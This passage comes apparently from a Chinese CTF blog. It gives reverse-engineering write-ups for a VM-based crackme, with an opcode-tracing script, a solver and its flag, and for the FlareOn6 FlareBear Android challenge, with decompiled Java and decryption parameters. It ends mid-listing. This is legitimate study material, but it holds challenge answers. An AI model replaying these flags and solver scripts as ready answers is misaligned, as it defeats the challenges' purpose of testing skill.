............à.z.</span><br><span class="line">10096CF0 23 00 00 00 E0 1F 7A 00 10 7C 00 10 00 00 00 00 #...à.z..|......</span><br><span class="line">10096D00 00 00 00 00 00 00 00 00 01 00 00 00 48 1B 0D 77 ............H..w</span><br><span class="line">10096D10 24 00 00 00 AC 49 06 77 70 9D 00 10 00 00 00 00 $...¬I.wp.......</span><br><span class="line">10096D20 00 00 00 00 00 00 00 00 00 00 00 00 66 34 03 77 ............f4.w</span><br><span class="line">10096D30 25 00 00 00 54 F4 36 00 F0 92 00 10 00 00 00 00 %...Tô6.ð.......</span><br><span class="line">10096D40 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 ................</span><br><span class="line">10096D50 26 00 00 00 B0 1D 7A 00 20 93 00 10 00 00 00 00 &amp;...°.z. .......</span><br><span class="line">10096D60 00 00 00 00 00 00 00 00 01 00 00 00 7F 00 00 00 ................</span><br><span class="line">10096D70 27 00 00 00 A6 06 00 00 90 7D 00 10 00 00 00 00 &#39;...¦....&#125;......</span><br><span class="line">10096D80 00 00 00 00 00 00 00 00 02 00 00 00 F8 03 00 00 ............ø...</span><br><span class="line">10096D90 28 00 00 00 50 01 79 00 20 7E 00 10 00 00 00 00 (...P.y. ~......</span><br><span class="line">10096DA0 00 00 00 00 00 00 00 00 02 00 00 00 E2 1F 7A 00 ............â.z.</span><br><span class="line">10096DB0 29 00 00 00 00 00 00 00 70 92 00 10 00 00 00 00 ).......p.......</span><br><span class="line">10096DC0 00 00 00 00 00 00 00 00 01 00 00 00 8C F4 36 00 .............ô6.</span><br><span class="line">10096DD0 2A 00 00 00 94 AA 08 77 B0 92 00 10 00 00 00 00 *....ª.w°.......</span><br><span class="line">10096DE0 00 00 00 00 00 00 00 00 01 00 00 00 00 00 79 00 ..............y.</span><br><span class="line">10096DF0 2B 00 00 00 B0 1D 7A 00 60 93 00 10 00 00 00 00 +...°.z.&#96;.......</span><br><span class="line">10096E00 00 00 00 00 00 00 00 00 01 00 00 00 74 F4 36 00 ............tô6.</span><br><span class="line">10096E10 2C 00 00 00 36 A4 08 77 A0 93 00 10 00 00 00 00 ,...6¤.w .......</span><br><span class="line">10096E20 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................</span><br><span class="line">10096E30 2D 00 00 00 00 02 04 06 30 90 00 10 00 00 00 00 -.......0.......</span><br><span class="line">10096E40 00 00 00 00 00 00 00 00 01 00 00 00 30 09 00 00 ............0...</span><br><span class="line">10096E50 2E 00 00 00 00 00 00 00 70 90 00 10 00 00 00 00 ........p.......</span><br><span class="line">10096E60 00 00 00 00 00 00 00 00 01 00 00 00 F0 0F 00 00 ............ð...</span><br><span class="line">10096E70 2F 00 00 00 ED 33 03 77 C0 90 00 10 00 00 00 00 &#x2F;...í3.wÀ.......</span><br><span class="line">10096E80 00 00 00 00 00 00 00 00 01 00 00 00 70 10 3C 76 ............p.&lt;v</span><br><span class="line">10096E90 30 00 00 00 00 00 79 00 00 91 00 10 00 00 00 00 0.....y.........</span><br><span class="line">10096EA0 00 00 00 00 00 00 00 00 01 00 00 00 7F 00 00 00 ................</span><br><span class="line">10096EB0 31 00 00 00 30 09 00 00 50 91 00 10 00 00 00 00 1...0...P.......</span><br><span class="line">10096EC0 00 00 00 00 00 00 00 00 01 00 00 00 D8 00 00 00 ............Ø...</span><br><span class="line">10096ED0 32 00 00 00 F0 0F 00 00 90 91 00 10 00 00 00 00 2...ð...........</span><br><span class="line">10096EE0 00 00 00 00 00 00 00 00 01 00 00 00 55 A5 08 77 ............U¥.w</span><br><span class="line">10096EF0 33 00 00 00 88 F2 36 00 E0 91 00 10 00 00 00 00 3....ò6.à.......</span><br><span class="line">10096F00 00 00 00 00 00 00 00 00 01 00 00 00 CA DA 07 77 ............ÊÚ.w</span><br><span class="line">10096F10 34 00 00 00 00 00 00 00 20 92 00 10 00 00 00 00 4....... .......</span><br><span class="line">10096F20 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................</span><br></pre></td></tr></table></figure>
2. 可以看到，前面是一个数字，后面是一系列的地址
3. vm函数地址为10005960,IDA中的地址为10006560,可以得到基址-c00
4. 继续调试发现，后面调用的函数就是对应位置的函数
5. 调试发现1007f15c不做任何事直接返回
6. 使用脚本处理上面dump出的数据，得到地址。另外opcode和vm_eip都可以分析出

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES,PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># add = []</span></span><br><span class="line"><span class="comment"># with open(&#x27;1.txt&#x27;,&#x27;r&#x27;) as f:</span></span><br><span class="line"><span class="comment">#     lines = f.readlines()</span></span><br><span class="line"><span class="comment">#     for i in range(0,len(lines),2):</span></span><br><span class="line"><span class="comment">#         l = lines[i][:-1]</span></span><br><span class="line"><span class="comment">#         f = l[0:2][::-1]+l[2:4][::-1]+l[4:6][::-1]+l[6:8][::-1]</span></span><br><span class="line"><span class="comment">#         f = f[::-1]</span></span><br><span class="line"><span class="comment">#         f = int(f,16)</span></span><br><span class="line"><span class="comment">#         print(hex(f))</span></span><br><span class="line"><span class="comment">#         add.append(f+0xc00)</span></span><br><span class="line"><span class="comment"># print(add)</span></span><br><span class="line">add = [<span class="number">0</span>,<span class="number">268477312</span>, <span class="number">268477376</span>, <span class="number">268476832</span>, <span class="number">268476912</span>, <span class="number">268477232</span>, <span class="number">268477152</span>, <span class="number">268476992</span>, <span class="number">268477072</span>, <span class="number">268468608</span>, <span class="number">268468688</span>, <span class="number">268479520</span>, <span class="number">268479600</span>, <span class="number">268477488</span>, <span class="number">268477568</span>, <span class="number">268471312</span>, <span class="number">268471408</span>, <span class="number">268477760</span>, <span class="number">268477840</span>, <span class="number">268482336</span>, <span class="number">268482416</span>, <span class="number">268468848</span>, <span class="number">268468928</span>, <span class="number">268477696</span>, <span class="number">268478944</span>, <span class="number">268479024</span>, <span class="number">268479120</span>, <span class="number">268479200</span>, <span class="number">268470976</span>, <span class="number">268478080</span>, <span class="number">268478144</span>, <span class="number">268477920</span>, <span class="number">268470000</span>, <span class="number">268470096</span>, <span class="number">268470192</span>, <span class="number">268470288</span>, <span class="number">268478832</span>, <span class="number">268476144</span>, <span class="number">268476192</span>, <span class="number">268470672</span>, <span class="number">268470816</span>, <span class="number">268476016</span>, <span class="number">268476080</span>, <span class="number">268476256</span>, <span class="number">268476320</span>, <span class="number">268475440</span>, <span class="number">268475504</span>, <span class="number">268475584</span>, <span class="number">268475648</span>, <span class="number">268475728</span>, <span class="number">268475792</span>, <span class="number">268475872</span>, <span class="number">268475936</span>]</span><br><span class="line"></span><br><span class="line">opc = [<span class="number">1</span>,<span class="number">0</span>,<span class="string">&#x27;strlen(input)&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;v0 - self((int)v4)&#x27;</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">39</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">47</span>,<span class="number">1</span>,<span class="number">54</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">37</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">40</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">47</span>,<span class="number">20</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">19</span>,<span class="number">4</span>,<span class="number">51</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">37</span>,<span class="number">-28</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">30</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">37</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">40</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">47</span>,<span class="number">20</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">20</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">37</span>,<span class="number">-28</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;self((int)v4)&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;self((int)v118)&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">28</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">1</span>,<span class="number">54</span>,<span class="number">34</span>,<span class="string">&#x27;self(0x1000A880)&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">54</span>]</span><br><span class="line">eip = <span class="number">0</span></span><br><span class="line">print(len(opc))</span><br><span class="line"><span class="keyword">while</span> eip&lt;len(opc):</span><br><span class="line">    ins = opc[eip]</span><br><span class="line">    print(<span class="string">&#x27;%02x:%02x:&#x27;</span>%(eip,ins),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    print(<span class="string">&#x27;%X:&#x27;</span>%(add[ins]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> ins==<span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&#x27;mov to tmp&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown4,maybe move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">4</span>:</span><br><span class="line">        print(<span class="string">&#x27;maybe move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&#x27;move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">6</span>:</span><br><span class="line">        print(<span class="string">&#x27;move v4&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">7</span>:</span><br><span class="line">        print(<span class="string">&#x27;add maybe&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x14</span>:</span><br><span class="line">        print(<span class="string">&#x27;xor&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x1c</span>:</span><br><span class="line">        print(<span class="string">&#x27;cmp&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x22</span>:</span><br><span class="line">        print(<span class="string">&#x27;real_unknown&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x25</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown3,maybe move&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x27</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x29</span>:</span><br><span class="line">        print(<span class="string">&#x27;jump&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x2f</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown2,maybe jump&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> ins==<span class="number">0x33</span>:</span><br><span class="line">        print(<span class="string">&#x27;maybe jump&#x27;</span>)</span><br><span class="line">    eip+=<span class="number">3</span></span><br></pre></td></tr></table></figure>
具体功能需要详细分析vm的结构

解题脚本
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line">v118 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">v118[<span class="number">0</span>] = <span class="number">81</span>;</span><br><span class="line">v118[<span class="number">1</span>] = <span class="number">95</span>;</span><br><span class="line">v118[<span class="number">2</span>] = <span class="number">114</span>;</span><br><span class="line">v118[<span class="number">3</span>] = <span class="number">105</span>;</span><br><span class="line">v118[<span class="number">4</span>] = <span class="number">106</span>;</span><br><span class="line">v118[<span class="number">5</span>] = <span class="number">50</span>;</span><br><span class="line">v118[<span class="number">6</span>] = <span class="number">137</span>;</span><br><span class="line">v118[<span class="number">7</span>] = <span class="number">121</span>;</span><br><span class="line">v118[<span class="number">8</span>] = <span class="number">43</span>;</span><br><span class="line">v118[<span class="number">9</span>] = <span class="number">82</span>;</span><br><span class="line">v118[<span class="number">10</span>] = <span class="number">82</span>;</span><br><span class="line">v118[<span class="number">11</span>] = <span class="number">86</span>;</span><br><span class="line">v118[<span class="number">12</span>] = <span class="number">74</span>;</span><br><span class="line">v118[<span class="number">13</span>] = <span class="number">77</span>;</span><br><span class="line">v118[<span class="number">14</span>] = <span class="number">96</span>;</span><br><span class="line">v118[<span class="number">15</span>] = <span class="number">18</span>;</span><br><span class="line">v4 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">v4[<span class="number">0</span>] = <span class="number">54</span>;</span><br><span class="line">v4[<span class="number">1</span>] = <span class="number">72</span>;</span><br><span class="line">v4[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">v4[<span class="number">3</span>] = <span class="number">35</span>;</span><br><span class="line">v4[<span class="number">4</span>] = <span class="number">12</span>;</span><br><span class="line">v4[<span class="number">5</span>] = <span class="number">37</span>;</span><br><span class="line">v4[<span class="number">6</span>] = <span class="number">9</span>;</span><br><span class="line">v4[<span class="number">7</span>] = <span class="number">23</span>;</span><br><span class="line">v4[<span class="number">8</span>] = <span class="number">83</span>;</span><br><span class="line">v4[<span class="number">9</span>] = <span class="number">6</span>;</span><br><span class="line">v4[<span class="number">10</span>] = <span class="number">16</span>;</span><br><span class="line">v4[<span class="number">11</span>] = <span class="number">26</span>;</span><br><span class="line">v4[<span class="number">12</span>] = <span class="number">36</span>;</span><br><span class="line">v4[<span class="number">13</span>] = <span class="number">46</span>;</span><br><span class="line">v4[<span class="number">14</span>] = <span class="number">56</span>;</span><br><span class="line">v4[<span class="number">15</span>] = <span class="number">66</span>;</span><br><span class="line"></span><br><span class="line">f = [(v118[i]^v4[i])<span class="number">-2</span>^<span class="number">0x33</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">print(bytes(f))</span><br></pre></td></tr></table></figure>

```V&amp;N&#123;W&amp;M_Easy_Re&#125;
</code></pre>
<h2 id="rev-FlareOn6-FlareBear"><a href="#rev-FlareOn6-FlareBear" class="headerlink" title="[rev][FlareOn6]FlareBear"></a>[rev][FlareOn6]FlareBear</h2><ol>
<li>FlarebeerActivity</li>
<li><p>clean看到danceWithFlag可以获取flag，需要的条件为isHappy&amp;&amp;isEcstatic，继续分析条件</p>
</li>
<li><p>getState使用PreferenceManager.getDefaultSharedPreferences获取配置，并且下面有setState</p>
</li>
<li>isHappy: getStat(‘f’)/getStat(‘p’)&gt;2.0&amp;&amp;&lt;2.5<br>来自于getPreference(‘activity’,’’)</li>
<li><p>isEcstatic: getState(‘mass’,0)==72&amp;&amp;getState(‘happy’,0)==30&amp;&amp;getState(‘clean’,0)==0<br>来自于getPreference(argString,argInt)</p>
</li>
<li><p>decrypt函数：pawsitive_vibes!是初始向量，key是NaClNaClNaCl，key填充方式是PBKDF2WithHmacSHA1</p>
</li>
<li>getPassword: <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">String str1;</span><br><span class="line">    <span class="keyword">int</span> i = getStat(<span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">    <span class="keyword">int</span> j = getStat(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">    <span class="keyword">int</span> k = getStat(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">    String str2 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> (i % <span class="number">9</span>) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        str1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        str1 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        str1 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        str1 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        str1 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        str1 = <span class="string">&quot;!&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        str1 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        str1 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        str1 = <span class="string">&quot;-&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        str1 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">switch</span> (k % <span class="number">7</span>) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        str2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        str2 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        str2 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        str2 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        str2 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        str2 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        str2 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    String str3 = StringsKt.repeat(<span class="string">&quot;flare&quot;</span>, i / k);</span><br><span class="line">    String str4 = StringsKt.repeat(rotN(<span class="string">&quot;bear&quot;</span>, i * j), j * <span class="number">2</span>);</span><br><span class="line">    String str5 = StringsKt.repeat(<span class="string">&quot;yeah&quot;</span>, k);</span><br><span class="line">    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    stringBuilder.append(str3);</span><br><span class="line">    stringBuilder.append(str1);</span><br><span class="line">    stringBuilder.append(str4);</span><br><span class="line">    stringBuilder.append(str2);</span><br><span class="line">    stringBuilder.append(str5);</span><br><span class="line">    <span class="keyword">return</span> stringBuilder.toString();</span><br></pre></td></tr></table></figure>
 i/j&gt;2.0&lt;2.5，j=1,i=2,j=2,i=4,j=4,i=8,j=2,i=5<br> flare重复i/k次+str1+</li>
<li>解密资源</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.InvalidKeySpecException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span 